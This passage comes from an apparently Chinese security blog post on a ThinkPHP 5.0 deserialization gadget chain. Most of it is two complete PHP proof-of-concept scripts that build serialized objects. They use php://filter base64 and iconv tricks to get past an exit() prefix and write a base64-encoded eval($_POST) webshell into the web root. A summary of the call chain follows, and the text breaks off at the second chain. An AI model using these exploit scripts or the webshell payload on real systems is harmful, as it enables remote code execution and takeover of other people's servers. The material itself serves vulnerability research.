+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432777.png" alt="image-20240118185945288"></p>
+<p>所以在<code>$result = file_put_contents($filename, $data);</code>时我们可以使得file_put_contents调用php://filter处理数据,从而达到绕过exit()的目的。</p>
+<p>最终的poc如下(该poc是windows和linux下都通用的)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()]; <span class="comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="title class_">Output</span>();  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="keyword">new</span> <span class="title class_">HasOne</span>();               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span> <span class="title class_">extends</span> <span class="title class_">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">db</span>\<span class="title class_">Query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>();    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="keyword">new</span> <span class="title class_">Output</span>(); <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle =<span class="keyword">new</span> <span class="title class_">Memcached</span>(); <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">File</span>(); <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span>=<span class="title class_">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将会在public目录生成a.php12ac95f1498ce51d2d96a249c09c1998.php其中内容为</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432778.png" alt="image-20240118194424571"></p>
+<h2 id="另一种思路">另一种思路:</h2>
+<p>还有另外一种思路绕过File::set()的exit()死亡杂糅</p>
+<p>在处理文件<code>\tp5.0\thinkphp\library\think\session\driver\Memcached.php</code>的Memcached类的write方法时我们不直接使得<code>$this-&gt;handler</code>指向File类,我们使其指向文件<code>\tp5.0\thinkphp\library\think\cache\driver\Memcache.php</code>的Memcached类的set方法。</p>
+<p>在这个set方法中我们可以同样可以看到<code>$this-&gt;handler-&gt;set</code>这时我们将<code>$this-&gt;handler</code>指向$File</p>
+<p>换句话说:我们通过Memcached类的set方法作为中转,绕一下调用File类的set方法。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432779.png" alt="image-20240118191151325"></p>
+<p>同样的当我们第一次调用Memcached::set时无法控制$value的值,但是任然存在setTagItem()方法被调用。</p>
+<p>通过setTagItem我们可以使得第二次调用Memcached::set,$value受我们控制。</p>
+<p>所以另外一种windows和linux平台都通用的poc如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()]; <span class="comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="title class_">Output</span>();  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="keyword">new</span> <span class="title class_">HasOne</span>();               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span> <span class="title class_">extends</span> <span class="title class_">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">db</span>\<span class="title class_">Query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>();    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="keyword">new</span> <span class="title class_">Output</span>(); <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle =<span class="keyword">new</span> <span class="title class_">Memcached</span>(); <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> \think\cache\driver\<span class="title function_ invoke__">Memcached</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">File</span>(); </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag =<span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]=<span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g&quot;</span>;<span class="comment">//这里写shell的base64形式</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span>=<span class="title class_">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.base64-decode/resource=&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将会在public目录生成a5c52af8656ce679eb29e3449834f23c.php其中内容为</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432780.png" alt="image-20240118194314277"></p>
+<h2 id="漏洞总结">漏洞总结:</h2>
+<p>对应两个poc的反序列化链</p>
+<p>反序列化链1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">起点:任意反序列化点</span><br><span class="line">--&gt;Windows::__destruct</span><br><span class="line">--&gt;Windows::removeFiles</span><br><span class="line">--&gt;file_exists(将类当作字符串触发__toString)</span><br><span class="line">--&gt;Pivot::__toString(方法继承于Model类,和下面的toJson和toArray一样)</span><br><span class="line">--&gt;Pivot::toJson--&gt;Pivot::toArray</span><br><span class="line">通过一系列手段使得$value成为Output类然后调用Output::getAttr(Output类没有getAttr方法触发__call)</span><br><span class="line">--&gt;Output::__call</span><br><span class="line">--&gt;Output::block--&gt;Output::writeln--&gt;Output::write</span><br><span class="line">--&gt;Memcached::write</span><br><span class="line">--&gt;File::set</span><br><span class="line">--&gt;File::setTagItem</span><br><span class="line">--&gt;File::set(绕过死亡杂糅写入文件)</span><br></pre></td></tr></table></figure>
+<p>反序列化链2</p>
